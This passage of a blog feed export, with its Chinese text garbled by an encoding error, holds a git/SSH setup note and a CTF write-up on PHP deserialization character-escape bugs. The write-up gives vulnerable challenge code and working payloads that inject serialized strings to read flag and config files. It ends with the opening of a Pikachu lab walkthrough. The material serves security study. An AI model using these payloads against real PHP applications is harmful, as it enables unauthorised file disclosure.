    <content><![CDATA[<p>è¿™ç¯‡æ–‡ç« ä¸»è¦æ˜¯è®°å½•ä¸€ä¸‹è‡ªå·±ä¹‹å‰åœ¨åˆ©ç”¨gitè¿™ä¸ªå‘½ä»¤æ—¶é‡åˆ°çš„ä¸€äº›é—®é¢˜ã€‚</p>
<span id="more"></span>

<p>1ã€æŸ¥çœ‹ç”¨æˆ·åå’Œé‚®ç®±æ˜¯å¦ä¸è‡ªå·±ä¹‹å‰è®¾ç½®çš„ä¸€æ ·</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git config --list</span><br></pre></td></tr></table></figure>

<p>2ã€å¦‚æœä¸ä¸€æ ·æˆ–è€…å¿˜äº†ä¹‹å‰è®¾ç½®çš„æ˜¯ä»€ä¹ˆäº†ï¼Œå¯ä»¥é‡ç½®ä¸€ä¸‹</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git config --global user.name <span class="string">&quot;ç”¨æˆ·å&quot;</span></span><br><span class="line">git config --global user.email <span class="string">&quot;é‚®ç®±&quot;</span></span><br></pre></td></tr></table></figure>

<p>3ã€åˆ é™¤æœ¬åœ°<code>.ssh</code>ç›®å½•ä¸‹çš„<code>known_host</code>ï¼Œ<code>id_rsa</code>ï¼Œ<code>id_rsa.pub</code>æ–‡ä»¶ï¼Œé‡æ–°ç”Ÿæˆ</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ssh-keygen -t rsa -C <span class="string">&quot;é‚®ç®±&quot;</span></span><br></pre></td></tr></table></figure>

<p>4ã€åœ¨<code>github</code>ä¸­æ–°å»º<code>ssh key</code></p>
<p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202409080000711.png" alt="QQ_1725724833042"></p>
<p>å¤åˆ¶<code>id_rsa.pub</code>ä¸­çš„å…¨éƒ¨å†…å®¹ï¼Œç²˜è´´åˆ°è¯¥å¤„ï¼Œç‚¹å‡»<code>Add SHH key</code>å³å¯</p>
<p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202409080002029.png" alt="QQ_1725724911246"></p>
<p>5ã€ç„¶åè¾“å…¥å‘½ä»¤</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ssh -T git@github.com</span><br></pre></td></tr></table></figure>

<p>â€‹	åˆ°è¿™ä¸€æ­¥åä¾ç„¶å‡ºé”™ï¼Œæˆ‘çš„æ˜¯å› ä¸ºå‘½åäº†å¯†é’¥, ä½†æ˜¯sshè¿æ¥é»˜è®¤æ˜¯ä¼šä½¿ç”¨é»˜è®¤åç§°çš„, å¹¶ä¸æ˜¯æ”¾åœ¨<code>~./ssh</code>ç›®å½•ä¸‹å°±ä¼šè‡ªåŠ¨è¯»å–ï¼Œæ‰€ä»¥æˆ‘é€šè¿‡ä½¿ç”¨<code>config</code>é…ç½®æ–‡ä»¶æ¥è§£å†³è¿™ä¸ªé—®é¢˜ã€‚</p>
<p>6ã€åœ¨<code>.ssh</code>ç›®å½•ä¸‹æ·»åŠ æ–‡ä»¶<code>config</code>ï¼Œåœ¨æ–‡ä»¶ä¸­æ·»åŠ ä¸‹é¢å†…å®¹</p>
<figure class="highlight crmsh"><table><tr><td class="code"><pre><span class="line">Host github.com</span><br><span class="line">	<span class="keyword">User</span> <span class="title">git</span></span><br><span class="line">	IdentityFile ~/.ssh/ç§é’¥æ–‡ä»¶åç§°</span><br></pre></td></tr></table></figure>

]]></content>
  </entry>
  <entry>
    <title>phpååºåˆ—åŒ–å­—ç¬¦é€ƒé€¸</title>
    <url>/2025/02/06/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%97%E7%AC%A6%E9%80%83%E9%80%B8/</url>
    <content><![CDATA[<p>phpååºåˆ—åŒ–å­—ç¬¦é€ƒé€¸ï¼Œå…¶å®å°±æ˜¯åˆ©ç”¨è¿‡æ»¤å‡½æ•°ä¼šä½¿åºåˆ—åŒ–å­—ç¬¦ä¸²å¢é•¿æˆ–ç¼©çŸ­çš„ç‰¹æ€§ï¼Œæ¥æ„é€ æ–°çš„åºåˆ—åŒ–å­—ç¬¦ä¸²è¿›è¡Œæ”»å‡»ã€‚</p>
<h2 id="æ¼æ´æˆå› "><a href="#æ¼æ´æˆå› " class="headerlink" title="æ¼æ´æˆå› "></a>æ¼æ´æˆå› </h2><p>åºåˆ—åŒ–å­—ç¬¦ä¸²åœ¨ç»è¿‡è¿‡æ»¤å‡½æ•°ä¸æ­£ç¡®çš„å¤„ç†è€Œå¯¼è‡´å¯¹è±¡æ³¨å…¥ï¼Œä¸»è¦åŸå› æ˜¯<strong>è¿‡æ»¤å‡½æ•°æ”¾åœ¨äº†<code>serialize</code>å‡½æ•°ä¹‹å</strong>ã€‚</p>
<span id="more"></span>

<h2 id="ç¼©çŸ­é€ƒé€¸"><a href="#ç¼©çŸ­é€ƒé€¸" class="headerlink" title="ç¼©çŸ­é€ƒé€¸"></a>ç¼©çŸ­é€ƒé€¸</h2><h2 id="å‚è€ƒæ–‡ç« "><a href="#å‚è€ƒæ–‡ç« " class="headerlink" title="å‚è€ƒæ–‡ç« "></a>å‚è€ƒæ–‡ç« </h2><p><a href="https://blog.csdn.net/weixin_44632787/article/details/119185112">BUUCTFä¹‹[å®‰æ´µæ¯ 2019]easy_serialize_php</a></p>
<h3 id="ä»£ç å®¡è®¡"><a href="#ä»£ç å®¡è®¡" class="headerlink" title="ä»£ç å®¡è®¡"></a>ä»£ç å®¡è®¡</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$function</span> = @<span class="variable">$_GET</span>[<span class="string">&#x27;f&#x27;</span>];  <span class="comment">#ä»$_GETè¶…å…¨å±€æ•°ç»„ä¸­è·å–ä¸€ä¸ªåä¸º f çš„é”®çš„å¯¹åº”å€¼ï¼Œä½¿ç”¨é”™è¯¯æ§åˆ¶è¿ç®—ç¬¦ @ æ¥æŠ‘åˆ¶å¯èƒ½å‘ç”Ÿçš„ä»»ä½•é”™è¯¯ã€‚GETä¼ å‚fçš„å€¼</span></span><br><span class="line"><span class="title function_ invoke__">extract</span>(<span class="variable">$_POST</span>);   <span class="comment">#æ•°ç»„çš„é”®æˆä¸ºæ–°å˜é‡çš„åç§°ï¼Œè€Œæ•°ç»„çš„å€¼æˆä¸ºè¿™äº›å˜é‡çš„å€¼ã€‚</span></span><br><span class="line"><span class="comment">#_SESSION[phpflag] = ;s:1:&quot;1&quot;;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA==&quot;;&#125;</span></span><br><span class="line"><span class="keyword">if</span>(!<span class="variable">$_GET</span>[<span class="string">&#x27;img_path&#x27;</span>])&#123;</span><br><span class="line">    <span class="variable">$_SESSION</span>[<span class="string">&#x27;img&#x27;</span>] = <span class="title function_ invoke__">base64_encode</span>(<span class="string">&#x27;guest_img.png&#x27;</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="variable">$_SESSION</span>[<span class="string">&#x27;img&#x27;</span>] = <span class="title function_ invoke__">sha1</span>(<span class="title function_ invoke__">base64_encode</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;img_path&#x27;</span>]));</span><br><span class="line">&#125;   </span><br><span class="line"><span class="comment">#$_SESSION[&#x27;img&#x27;] = base64_encode(&#x27;guest_img.png&#x27;);</span></span><br><span class="line"><span class="variable">$serialize_info</span> = <span class="title function_ invoke__">filter</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$_SESSION</span>));</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$function</span> == <span class="string">&#x27;show_image&#x27;</span>)&#123;</span><br><span class="line">    <span class="variable">$userinfo</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$serialize_info</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="title function_ invoke__">base64_decode</span>(<span class="variable">$userinfo</span>[<span class="string">&#x27;img&#x27;</span>]));</span><br><span class="line">&#125; </span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params"><span class="variable">$img</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$filter_arr</span> = <span class="keyword">array</span>(<span class="string">&#x27;php&#x27;</span>,<span class="string">&#x27;flag&#x27;</span>,<span class="string">&#x27;php5&#x27;</span>,<span class="string">&#x27;php4&#x27;</span>,<span class="string">&#x27;fl1g&#x27;</span>);</span><br><span class="line">    <span class="variable">$filter</span> = <span class="string">&#x27;/&#x27;</span>.<span class="title function_ invoke__">implode</span>(<span class="string">&#x27;|&#x27;</span>,<span class="variable">$filter_arr</span>).<span class="string">&#x27;/i&#x27;</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">preg_replace</span>(<span class="variable">$filter</span>,<span class="string">&#x27;&#x27;</span>,<span class="variable">$img</span>);</span><br><span class="line">    <span class="comment">#å°†åŒ¹é…çš„éƒ¨åˆ†æ›¿æ¢ä¸ºç©ºå­—ç¬¦ä¸²(åˆ é™¤ï¼Œè¿™é‡Œå¥½åƒå¯ä»¥åŒå†™ç»•è¿‡ä¸ç¡®å®š)</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<h4 id="extract-å‡½æ•°"><a href="#extract-å‡½æ•°" class="headerlink" title="extract()å‡½æ•°"></a><code>extract()</code>å‡½æ•°</h4><p><code>extract()</code>å‡½æ•°ç”¨äºå°†æ•°ç»„ä¸­çš„é”®å€¼å¯¹è½¬æ¢ä¸ºå˜é‡ã€‚ä½¿ç”¨<code>extract()</code>å‡½æ•°æ—¶ï¼Œæ•°ç»„çš„é”®æˆä¸ºæ–°å˜é‡çš„åç§°ï¼Œè€Œæ•°ç»„çš„å€¼æˆä¸ºè¿™äº›å˜é‡çš„å€¼ã€‚</p>
<p>æ ¹æ®<code>extract()</code>æˆ‘ä»¬å¯ä»¥è¿›è¡Œå˜é‡è¦†ç›–ï¼Œå½“æˆ‘ä»¬ä¼ å…¥<code>SESSION[flag]=123</code>æ—¶ï¼Œ<code>SESSION[&quot;user&quot;]</code>å’Œ<code>SESSION[&#39;function&#39;]</code>å…¨éƒ¨ä¼šæ¶ˆå¤±,åªå‰©ä¸‹<code>SESSION[flag]=123</code>ã€‚</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	<span class="variable">$arr</span> = <span class="keyword">array</span>(<span class="string">&#x27;name&#x27;</span>=&gt;<span class="string">&#x27;jt&#x27;</span>);</span><br><span class="line">	<span class="title function_ invoke__">extract</span>(<span class="variable">$arr</span>);</span><br><span class="line">	<span class="keyword">echo</span> <span class="variable">$name</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">    <span class="comment">#è¾“å‡ºï¼šjt</span></span><br></pre></td></tr></table></figure>

<h3 id="ååºåˆ—åŒ–å­—ç¬¦é€ƒé€¸"><a href="#ååºåˆ—åŒ–å­—ç¬¦é€ƒé€¸" class="headerlink" title="ååºåˆ—åŒ–å­—ç¬¦é€ƒé€¸"></a>ååºåˆ—åŒ–å­—ç¬¦é€ƒé€¸</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="comment">// extract($_POST);</span></span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;phpflag&#x27;</span>] = <span class="string">&#x27;;s:1:&quot;1&quot;;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA==&quot;;&#125;&#x27;</span>;</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;img&#x27;</span>] = <span class="title function_ invoke__">base64_encode</span>(<span class="string">&#x27;guest_img.png&#x27;</span>);</span><br><span class="line"><span class="variable">$serialize_info</span> = <span class="title function_ invoke__">filter</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$_SESSION</span>));</span><br><span class="line">	</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params"><span class="variable">$img</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$filter_arr</span> = <span class="keyword">array</span>(<span class="string">&#x27;php&#x27;</span>,<span class="string">&#x27;flag&#x27;</span>,<span class="string">&#x27;php5&#x27;</span>,<span class="string">&#x27;php4&#x27;</span>,<span class="string">&#x27;fl1g&#x27;</span>);</span><br><span class="line">    <span class="variable">$filter</span> = <span class="string">&#x27;/&#x27;</span>.<span class="title function_ invoke__">implode</span>(<span class="string">&#x27;|&#x27;</span>,<span class="variable">$filter_arr</span>).<span class="string">&#x27;/i&#x27;</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">preg_replace</span>(<span class="variable">$filter</span>,<span class="string">&#x27;&#x27;</span>,<span class="variable">$img</span>);</span><br><span class="line">&#125;</span><br><span class="line">	<span class="comment">// echo file_get_contents(base64_decode($userinfo[&#x27;img&#x27;]));</span></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$serialize_info</span>;</span><br><span class="line"><span class="comment">#a:2:&#123;s:7:&quot;&quot;;s:48:&quot;;s:1:&quot;1&quot;;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA==&quot;;&#125;&quot;;s:3:&quot;img&quot;;s:20:&quot;Z3Vlc3RfaW1nLnBuZw==&quot;;&#125;</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">s:7:&quot;&quot;;s:48:&quot;;s:1:&quot;1&quot;;</span></span><br><span class="line"><span class="comment">s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA==&quot;;</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$_SESSION</span>);</span><br><span class="line"><span class="comment">#a:2:&#123;s:7:&quot;phpflag&quot;;s:48:&quot;;s:1:&quot;1&quot;;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA==&quot;;&#125;&quot;;s:3:&quot;img&quot;;s:20:&quot;Z3Vlc3RfaW1nLnBuZw==&quot;;&#125;</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<h3 id="è§£é¢˜"><a href="#è§£é¢˜" class="headerlink" title="è§£é¢˜"></a>è§£é¢˜</h3><p>æ„é€ çš„åºåˆ—åŒ–ä¸²ä¸º<code>;s:1:&quot;1&quot;;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA==&quot;;&#125;</code></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;phpflag&#x27;</span>] = <span class="string">&#x27;;s:1:&quot;1&quot;;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA==&quot;;&#125;&#x27;</span>;</span><br></pre></td></tr></table></figure>

<p>ç”±äºæ˜¯ç”±<code>extract($_POST)</code>é‡æ–°è®¾ç½®çš„å˜é‡ï¼Œæœ€ç»ˆ<code>payload</code>ä¸º<br><code>_SESSION[phpflag]=;s:1:&quot;1&quot;;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA==&quot;;&#125;</code></p>
<img src="https://raw.githubusercontent.com/Qwen11/picture/main/202502060204888.png" alt="image-20241118231728369" style="zoom:50%;" />

<img src="https://raw.githubusercontent.com/Qwen11/picture/main/202502060204435.png" alt="image-20241118231700590" style="zoom:50%;" />

<p><code>/d0g3_fllllllag</code>é‡Œåº”è¯¥å°±æ˜¯<code>flag</code>äº†ï¼Œå°†<code>payload</code>ä¸­çš„<code>ZDBnM19mMWFnLnBocA==</code>æ›¿æ¢æˆ<code>L2QwZzNfZmxsbGxsbGFn</code>å³å¯ã€‚</p>
<h2 id="å¢é•¿é€ƒé€¸"><a href="#å¢é•¿é€ƒé€¸" class="headerlink" title="å¢é•¿é€ƒé€¸"></a>å¢é•¿é€ƒé€¸</h2><p>é€šè¿‡ä¸‹é¢è¿™ä¸ªä¾‹å­å­¦ä¹ ä¸€ä¸‹ï¼š</p>
<p>ä¸èƒ½å¯¹<code>$pass</code>è¿›è¡Œæ”¹åŠ¨ï¼Œè¦æ±‚è¾“å‡º<code>hack</code>ã€‚</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params"><span class="variable">$str</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;bb&#x27;</span>, <span class="string">&#x27;ccc&#x27;</span>, <span class="variable">$str</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>=<span class="string">&#x27;bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb&quot;;s:4:&quot;pass&quot;;s:4:&quot;hack&quot;;&#125;&#x27;</span>;</span><br><span class="line"><span class="comment">//     public $name = &#x27;aaa&#x27;;</span></span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$pass</span>=<span class="string">&#x27;123456&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$AA</span>=<span class="keyword">new</span> <span class="title function_ invoke__">A</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$AA</span>).<span class="string">&quot;\n&quot;</span>;</span><br><span class="line"><span class="variable">$res</span>=<span class="title function_ invoke__">filter</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$AA</span>));</span><br><span class="line"></span><br><span class="line"><span class="variable">$c</span>=<span class="title function_ invoke__">unserialize</span>(<span class="variable">$res</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$c</span>-&gt;pass;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>&#x3D;&#x3D;[0CTF 2016]piapiapia&#x3D;&#x3D;</p>
<p>å…³é”®ä»£ç ï¼š</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="keyword">require_once</span>(<span class="string">&#x27;class.php&#x27;</span>);</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;phone&#x27;</span>] &amp;&amp; <span class="variable">$_POST</span>[<span class="string">&#x27;email&#x27;</span>] &amp;&amp; <span class="variable">$_POST</span>[<span class="string">&#x27;nickname&#x27;</span>] &amp;&amp; <span class="variable">$_FILES</span>[<span class="string">&#x27;photo&#x27;</span>]) &#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/[^a-zA-Z0-9_]/&#x27;</span>, <span class="variable">$_POST</span>[<span class="string">&#x27;nickname&#x27;</span>]) || <span class="title function_ invoke__">strlen</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;nickname&#x27;</span>]) &gt; <span class="number">10</span>)</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&#x27;Invalid nickname&#x27;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="variable">$profile</span>[<span class="string">&#x27;nickname&#x27;</span>] = <span class="variable">$_POST</span>[<span class="string">&#x27;nickname&#x27;</span>];</span><br><span class="line">        <span class="variable">$profile</span>[<span class="string">&#x27;photo&#x27;</span>] = <span class="string">&#x27;upload/&#x27;</span> . <span class="title function_ invoke__">md5</span>(<span class="variable">$file</span>[<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line">        </span><br><span class="line">        <span class="variable">$user</span>-&gt;<span class="title function_ invoke__">update_profile</span>(<span class="variable">$username</span>, <span class="title function_ invoke__">serialize</span>(<span class="variable">$profile</span>));</span><br><span class="line">    &#125;</span><br><span class="line">------------------------------------------------------------------------------------</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params"><span class="variable">$string</span></span>) </span>&#123;</span><br><span class="line">    <span class="variable">$escape</span> = <span class="keyword">array</span>(<span class="string">&#x27;\&#x27;&#x27;</span>, <span class="string">&#x27;\\\\&#x27;</span>);</span><br><span class="line">    <span class="variable">$escape</span> = <span class="string">&#x27;/&#x27;</span> . <span class="title function_ invoke__">implode</span>(<span class="string">&#x27;|&#x27;</span>, <span class="variable">$escape</span>) . <span class="string">&#x27;/&#x27;</span>;</span><br><span class="line">    <span class="variable">$string</span> = <span class="title function_ invoke__">preg_replace</span>(<span class="variable">$escape</span>, <span class="string">&#x27;_&#x27;</span>, <span class="variable">$string</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="variable">$safe</span> = <span class="keyword">array</span>(<span class="string">&#x27;select&#x27;</span>, <span class="string">&#x27;insert&#x27;</span>, <span class="string">&#x27;update&#x27;</span>, <span class="string">&#x27;delete&#x27;</span>, <span class="string">&#x27;where&#x27;</span>);</span><br><span class="line">    <span class="variable">$safe</span> = <span class="string">&#x27;/&#x27;</span> . <span class="title function_ invoke__">implode</span>(<span class="string">&#x27;|&#x27;</span>, <span class="variable">$safe</span>) . <span class="string">&#x27;/i&#x27;</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">preg_replace</span>(<span class="variable">$safe</span>, <span class="string">&#x27;hacker&#x27;</span>, <span class="variable">$string</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">#------------------------profile.php----------------------------</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="keyword">require_once</span>(<span class="string">&#x27;class.php&#x27;</span>);</span><br><span class="line">    <span class="variable">$username</span> = <span class="variable">$_SESSION</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line">    <span class="variable">$profile</span>=<span class="variable">$user</span>-&gt;<span class="title function_ invoke__">show_profile</span>(<span class="variable">$username</span>);</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$profile</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$profile</span>);</span><br><span class="line">        <span class="variable">$phone</span> = <span class="variable">$profile</span>[<span class="string">&#x27;phone&#x27;</span>];</span><br><span class="line">        <span class="variable">$email</span> = <span class="variable">$profile</span>[<span class="string">&#x27;email&#x27;</span>];</span><br><span class="line">        <span class="variable">$nickname</span> = <span class="variable">$profile</span>[<span class="string">&#x27;nickname&#x27;</span>];</span><br><span class="line">        <span class="variable">$photo</span> = <span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$profile</span>[<span class="string">&#x27;photo&#x27;</span>]));</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">-------------------------------------------------------------------------------</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">show_profile</span>(<span class="params"><span class="variable">$username</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$username</span> = <span class="built_in">parent</span>::<span class="title function_ invoke__">filter</span>(<span class="variable">$username</span>);</span><br><span class="line">        <span class="variable">$where</span> = <span class="string">&quot;username = &#x27;<span class="subst">$username</span>&#x27;&quot;</span>;</span><br><span class="line">        <span class="variable">$object</span> = <span class="built_in">parent</span>::<span class="title function_ invoke__">select</span>(<span class="variable">$this</span>-&gt;table, <span class="variable">$where</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$object</span>-&gt;profile;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<h3 id="è§£é¢˜-1"><a href="#è§£é¢˜-1" class="headerlink" title="è§£é¢˜"></a>è§£é¢˜</h3><p>â€‹	åºåˆ—åŒ–åï¼Œç´§æ¥ç€å°±æ˜¯å¯¹åºåˆ—åŒ–å­—ç¬¦ä¸²è¿›è¡Œè¿‡æ»¤ï¼Œæƒ³åˆ°ååºåˆ—åŒ–å­—ç¬¦é€ƒé€¸æ¼æ´ï¼Œ<code>where-&gt;hacker</code>æœ¬é¢˜æ˜¯å¢é•¿é€ƒé€¸ã€‚</p>
<p>â€‹	åˆ©ç”¨æ•°ç»„ç»•è¿‡<code>preg_match</code>å¯¹<code>nickname</code>çš„æ£€æŸ¥ï¼Œä¼ å…¥<code>nickname[]</code>å³å¯ã€‚</p>
<p>å› ä¸ºå‰é¢æ˜¯<strong>æ•°ç»„</strong>ï¼Œæ‰€ä»¥é—­åˆæ–¹å¼ç”±<code>&quot;;</code>å˜æˆäº†**<code>&quot;;&#125;</code>**ï¼Œå› æ­¤ä¹Ÿè¦å¤šåŠ ä¸€ä¸ª<code>where</code>ï¼Œæœ€åçš„<code>payload</code>å¦‚ä¸‹ï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">wherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewhere</span><br><span class="line">&quot;;&#125;s:5:&quot;photo&quot;;s:10:&quot;config.php&quot;;&#125;</span><br><span class="line"></span><br><span class="line">wherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewhere</span><br><span class="line">&quot;;s:5:&quot;photo&quot;;s:10:&quot;config.php&quot;;&#125;</span><br></pre></td></tr></table></figure>

<h3 id="æ³¨ï¼š"><a href="#æ³¨ï¼š" class="headerlink" title="æ³¨ï¼š"></a><strong>æ³¨</strong>ï¼š</h3><p>â€‹	æ‹¿åˆ°äº†åé—¨æ–‡ä»¶åå‘ç°<code>www</code>ç›®å½•ä¸‹æœ‰è®¸å¤š<code>.php</code>æ–‡ä»¶ï¼Œä½†æ˜¯ä¾ç„¶æ²¡æœ‰ä»»ä½•æ€è·¯ï¼Œå‚»å‚»çš„åˆ†æè¿™äº›ä»£ç è¿˜ä»¥ä¸ºæ˜¯<code>sql</code>æ³¨å…¥ğŸ™ƒã€‚çœ‹<code>wp</code>æ‰çŸ¥é“è¦è®¿é—®ä¸€ä¸‹è¿™äº›æ–‡ä»¶çš„è·¯ç”±ï¼Œå…¶å®åˆ†æä»£ç çš„æ—¶å€™ä¹Ÿèƒ½çœ‹å‡ºæ¥è¿™äº›<code>.php</code>æ–‡ä»¶éƒ½æ˜¯å¯ä»¥è®¿é—®çš„ã€‚</p>
<p>â€‹	è¿™é“é¢˜æ€è·¯<code>payload</code>éƒ½æ²¡é—®é¢˜åï¼Œè¿˜æ˜¯ä¸€ç›´æ‰“ä¸é€šï¼Œæ¢äº†ä¸¤ä¸ª<code>bp</code>ä¸‰ä¸ªæµè§ˆå™¨ï¼Œ<code>Hackbar</code>ä¹Ÿå°è¯•è¿‡ï¼Œéƒ½å¤±è´¥äº†ğŸ˜­ã€‚è§£å†³è¿‡ç¨‹ï¼š<br>ç»è¿‡ä¸åŒçš„æµ‹è¯•åå‘ç°å¯èƒ½æ˜¯<code>bp</code>é‡Œè™½ç„¶ä¿®æ”¹äº†ï¼Œä½†æ˜¯æäº¤çš„æ•°æ®è¿˜æ˜¯åŸæ¥çš„å†…å®¹ï¼Œæˆ‘è¿˜ä¸€ç›´ä»¥ä¸ºæ˜¯æˆ‘<code>bp</code>çš„é—®é¢˜ã€‚æœ€åå‘ç°å…¶å®æ˜¯å°†æ•°æ®åŒ…å‘é€åˆ°<code>Repeater</code>åçš„ä¿®æ”¹æ— æ•ˆğŸ˜…ï¼ŒçœŸç¦»è°±ã€‚æ‰€ä»¥æŠ“åŒ…åè¦å…ˆä¿®æ”¹å†…å®¹ï¼Œå†æŠŠæ•°æ®åŒ…å‘é€åˆ°<code>Repeater</code>ï¼Œè¿™æ ·çš„ä¿®æ”¹æ‰æ˜¯æœ‰æ•ˆçš„ã€‚</p>
]]></content>
      <categories>
        <category>webå®‰å…¨</category>
      </categories>
      <tags>
        <tag>webå®‰å…¨</tag>
        <tag>phpååºåˆ—åŒ–</tag>
      </tags>
  </entry>
  <entry>
    <title>pikachué¶åœºé€šå…³è®°å½•</title>
    <url>/2024/10/17/pikachu%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/</url>
    <content><![CDATA[<p>Pikachué¶åœºæ˜¯ä¸€ä¸ªç”¨äºå­¦ä¹ å’Œæµ‹è¯•ç½‘ç»œå®‰å…¨çš„ç»ƒä¹ å¹³å°ï¼Œä¸»è¦ç”¨äºWebå®‰å…¨æ¼æ´çš„å®è·µå’Œç ”ç©¶ã€‚å®ƒåŒ…å«äº†ä¸€ç³»åˆ—å¸¸è§çš„Webå®‰å…¨æ¼æ´ã€‚</p>
<span id="more"></span>

<h2 id="Brute-Forceæš´åŠ›ç ´è§£"><a href="#Brute-Forceæš´åŠ›ç ´è§£" class="headerlink" title="Brute Forceæš´åŠ›ç ´è§£"></a><code>Brute Force</code>æš´åŠ›ç ´è§£</h2><h3 id="åŸºäºè¡¨å•çš„æš´åŠ›ç ´è§£"><a href="#åŸºäºè¡¨å•çš„æš´åŠ›ç ´è§£" class="headerlink" title="åŸºäºè¡¨å•çš„æš´åŠ›ç ´è§£"></a>åŸºäºè¡¨å•çš„æš´åŠ›ç ´è§£</h3><p>ç›´æ¥çˆ†ç ´</p>
<h3 id="éªŒè¯ç ç»•è¿‡-on-server"><a href="#éªŒè¯ç ç»•è¿‡-on-server" class="headerlink" title="éªŒè¯ç ç»•è¿‡(on server)"></a>éªŒè¯ç ç»•è¿‡(<code>on server</code>)</h3><p>è¿™ç§åŒä¸Šé¢ä¸€æ ·ï¼Œç›´æ¥çˆ†ç ´</p>
